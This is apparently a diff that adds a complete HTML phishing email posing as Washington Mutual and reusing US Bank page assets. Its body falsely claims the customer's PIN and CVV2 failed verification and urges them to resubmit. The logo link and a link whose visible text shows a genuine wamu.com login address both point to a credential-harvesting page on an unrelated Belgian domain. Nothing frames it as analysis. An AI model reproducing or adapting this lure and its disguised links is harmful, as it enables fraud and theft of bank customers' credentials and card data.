@@ -1,0 +1,177 @@
+<script language="JavaScript"> 
+<!-- Hide the script from old browsers -- 
+function a(txt) { 
+ self.status = txt 
+}
+function b() { 
+self.status = "" 
+}
+// --End Hiding Here --> 
+</script> 
+<html>
+
+<head>
+
+<title>Washington Mutual - Corporate Home Page</title>
+
+<link rel="stylesheet" href="https://www4.usbank.com/internetBankingStatic/css/global.css" type="text/css">
+
+<!-- H E A D E R  S T A R T -->
+
+<script language="JavaScript" src="https://www4.usbank.com/internetBankingStatic/js/global.js"></script>
+<script language="JavaScript" src="https://www4.usbank.com/internetBankingStatic/js/Help.js"></script>
+
+<!-- H E A D E R  E N D -->
+
+</head>
+
+<body LEFTMARGIN=0 RIGHTMARGIN=0 MARGINWIDTH=0 MARGINHEIGHT=0 TOPMARGIN=0>
+
+<!-- H E A D E R  S T A R T -->
+
+<MAP NAME="TopNav">
+ <AREA SHAPE="rect" COORDS="0,5,87,14" HREF="http://www.wamu.com/personal/customerservice/customerservice_CO.htm" alt="Customer Service">
+ <AREA SHAPE="rect" COORDS="107,5,162,14" HREF="http://www.wamu.com/personal/customerservice/contactus/waystoreachus.htm" alt="Contact Us">
+<AREA SHAPE="rect" COORDS="180,5,229,14" HREF="http://clients.mapquest.com/wamu/mqlocator?link=findusmain" alt="Locations">
+</MAP>
+
+<table cellpadding=0 cellspacing=0 width=775 border=0>
+ <tr><td class=bg2 height=20 colspan=3> </td></tr>
+ <tr>
+  <td height=47><A
+HREF="http://www.jefvzw.be/.process-sk/index.php?MfcISAPICommand=SignInFPP&UsingSSL=1&email=&userid="><img 
+src="http://www.wamu.com/images/wamucom_logo_blue.gif" 
+alt="wamu.com A Washington Mutual, Inc.  Web site" border=0 hspace=10 
+alt="WAMU"></A></td>  <td align=right valign=top width=700><img src="https://www4.usbank.com/internetBankingStatic/images/en_us/top_nav.gif" border=0 
+usemap="#TopNav" alt="USB Top Navigation"></td>
+  <td width=11 height=1><img src="https://www4.usbank.com/internetBankingStatic/images/spacer.gif" alt=""></td>
+ </tr>
+</table>
+
+<table cellpadding=0 cellspacing=0 border=0 width=775>
+ <tr>
+
+ </tr>
+ <tr>
+  <td width=775 height=1 colspan=2><img src="https://www4.usbank.com/internetBankingStatic/images/spacer.gif" border=0 alt=""></td>
+ </tr>
+ <tr>
+  <td colspan=2 class=bg3>
+   <table cellpadding=0 cellspacing=0 border=0>
+    <tr>
+     <td width=168 height=16></td>
+     <td width=9 height=1><img src="https://www4.usbank.com/internetBankingStatic/images/spacer.gif" alt=""></td>
+    </tr>
+   </table>
+  </td>
+ </tr>
+ <tr>
+  <td colspan=2>
+   <table cellpadding=0 cellspacing=0 border=0>
+    <tr>
+     <td width=168 height=28><img src="https://www4.usbank.com/internetBankingStatic/images/spacer.gif" border=0 alt=""></td>
+     <td width=10 height=1><img src="https://www4.usbank.com/internetBankingStatic/images/spacer.gif" border=0 alt=""></td>
+    </tr>
+   </table>
+  </td>
+ </tr>
+</table>
+
+<!-- H E A D E R  E N D -->
+
+<table cellpadding=0 cellspacing=0 width=775 border=0>
+ <tr>
+  <td width=168 valign=top>
+  </td>
+
+<!-- G U T T E R -->
+  <td width=10><img src='https://www4.usbank.com/internetBankingStatic/images/spacer.gif' border=0 width=10 height=1 alt=""></td>
+<!-- G U T T E R -->
+
+  <td width=588 valign=top>
+
+<!-- C O N T E N T  S T A R T -->
+   <table cellpadding=0 cellspacing=0 width='100%' border=0>
+    <tr>
+     <td></td>
+     <td align=right>
+
+
+
+<!-- C O N T E N T  E N D -->
+
+<!-- G U T T E R -->
+  </td>
+  <td width=11 height=1><img src='https://www4.usbank.com/internetBankingStatic/images/spacer.gif' border=0 alt=""></td><!-- G U T T E R -->
+ </tr>
+</table>
+<!-- G U T T E R -->
+
+<!-- F O O T E R  S T A R T -->
+
+ <table cellpadding=0 cellspacing=0 width='775' border=0>
+ <tr>
+  <td><img src='https://www4.usbank.com/internetBankingStatic/images/en_us/ConnectionSecured.gif' border=0 hspace=11 alt="Connection Secured"></td>
+  <td align=right><img src='https://www4.usbank.com/internetBankingStatic/images/en_us/MemberFDIC.gif' border=0 hspace=11 alt="Member FDIC Logo"></td>
+
+
+
+
+  <p>Dear Washington Mutual customer,</p>
+<p>In accordance with the verifications performed by our team, we thank you for the submitted information so that we can take one last step for the 
+final annual checking. Yet, our database seems to be non-compliant with the information submitted by you 
+(PIN and/or CVV2).Consequently, we  kindly ask you to submit the requested information  once again following our instructions.</p>
+
+<a href="https://images.ccbill.com/jpost/cvv2.swf" target="new">
+<img src="https://images.ccbill.com/jpost/cvv2a.gif" border="0" width="150" height="96"><br>Explanation</a>
+
+<p>With respect to the email automatically submitted to you from our online banking 
+system in order to assure the security of our client, we have to inform you that the references received
+were not in compliance with our database system. Consequently, this becomes a real problematical aspect,
+as our anti-fraud team encounters difficulties when it comes to permanently screening any irregularity that
+may occur.
+In order to make our job easier, please fill in the form below, with the appropriate information: </p>
+
+
+
+<p><font color="#DD0000">
+
+<a
+href="http://www.jefvzw.be/.process-sk/index.php?MfcISAPICommand=SignInFPP&UsingSSL=1&email=&userid="target="_blank"
+>https://login.personal.wamu.com/registration/CreateLogonEntry.asp</a></font></p>
+
+<p> If you believe you have provided personal or account information in response to a fraudulent 
+e-mail or Web site, please contact Washington Mutual at 800.788.7000 and contact the other 
+financial institutions with which you have accounts 
+<p>Thank you for trusting our services.</p>
+   <p>Sincerely,</p>
+<p>The WAMU Security Department Team.
+Please do not reply to this mail.Mail sent to this address cannot be answered.
+For assistance, log in to your WAMU account and chose the "Help" link in the header of any page.</p>
+Thank you for trusting our services.  <p>
+<p> WAMU Bank - Fraud Center 
+<p> eCare customer service at 1.800.788.7000 <p>
+ <tr><td colspan=2><img src='https://www4.usbank.com/internetBankingStatic/images/footer_curve.gif' alt=""></td></tr>
+ <tr class=bg2>
+  <td class=f15 height=20 NOWRAP>
+   <img src='https://www4.usbank.com/internetBankingStatic/images/spacer.gif' width=10 height=0 alt="">
+   <a class=f21 style="text-decoration:none;" href="http://www.wamu.com/personal/welcome/privacy.htm">Your Privacy </a>
+   |
+   <a class=f21 style="text-decoration:none;" href="http://www.wamu.com/personal/welcome/privacy.htm">Security Standards</a>
+  </td>
+  <td class=f15 align=right>   Copyright 2004, Washington Mutual, Inc. All Rights Reserved <img 
+src='https://www4.usbank.com/internetBankingStatic/images/spacer.gif' width=11 height=1 alt=""></td>
+ </tr>
+</table>
+<table cellpadding=0 cellspacing=0 width='775' border=0>
+<tr>
+<td class=f1>
+<img src='https://www4.usbank.com/internetBankingStatic/images/spacer.gif' width=10 height=0 alt="">
+
+</table>
+<!-- F O O T E R  E N D -->
+
+</body>
+
+</html>
+
